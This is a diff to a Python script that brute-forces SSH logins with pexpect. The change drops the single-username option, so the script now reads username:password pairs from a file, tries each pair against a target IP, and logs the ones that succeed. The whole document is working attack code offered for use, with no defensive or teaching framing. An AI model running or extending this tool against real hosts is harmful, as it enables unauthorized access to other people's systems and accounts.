@@ -6,7 +6,6 @@ from misc import *
 # add options 
 parser = optparse.OptionParser()
 parser.add_option('-i', dest='host', help="enter the target device's IP address")
-parser.add_option('-u', dest='username', help="enter the username of the target device")
 parser.add_option('-f', dest="file_location", help="enter password file location")
 (options, arg) = parser.parse_args()
 
@@ -15,15 +14,21 @@ prompt = ['#', '>>>', '>', '\$ ']
 # TODO: use regex to check for IP validity
 if options.host == "":
     log_error("You must provide a host IP address")
-    sys.exit(2)
-
-if options.username == "":
-    log_error("You must provide a username")
-    sys.exit(2)
+    sys.exit()
+else:
+    host = options.host
 
 if options.file_location == "":
     log_error("You must provide a location to potential passwords")
-    sys.exit(2)
+    sys.exit()
+else:
+    file_location = options.file_location
+
+# check if file exist
+try:
+    file = open(file_location, 'r')
+except:
+    log_error("File not found")
 
 def ssh(host, username, password):
     ssh_newkey = "Are you sure you want to continue connecting"
@@ -35,7 +40,7 @@ def ssh(host, username, password):
         return
     elif ret == 1:
         child.sendline("yes")
-        ret = child.expect([pexpect.TIMEOUT, "[P|p]assword"])
+        ret = child.expect([pexpect.TIMEOUT, "password"])
         if ret == 0:
             log_error(f"Failed to connect to {host}")
             return
@@ -44,17 +49,15 @@ def ssh(host, username, password):
     child.expect(prompt, timeout=0.5)
     return child
 
-file_location = options.file_location
-file = open(file_location, 'r')
-host = options.host
-username = options.username
-for password in file.readlines():
+for line in file.readlines():
     try:
-        password = password.strip('\n')
+        username_pw_list = line.split(':')
+        username = str(username_pw_list[0]).strip('\n')
+        password = str(username_pw_list[1]).strip('\n')
         child = ssh(host, username, password)
-        log_info(f"Password found: {password}")
+        log_info(f"Succeeded: username: {username} Password: {password}")
     except:
-        log_error(f"Wrong password: {password}")
+        log_notice(f"Now attempting username: {username} password: {password}")
 log_notice("All passwords provided has been attempted")
 
 
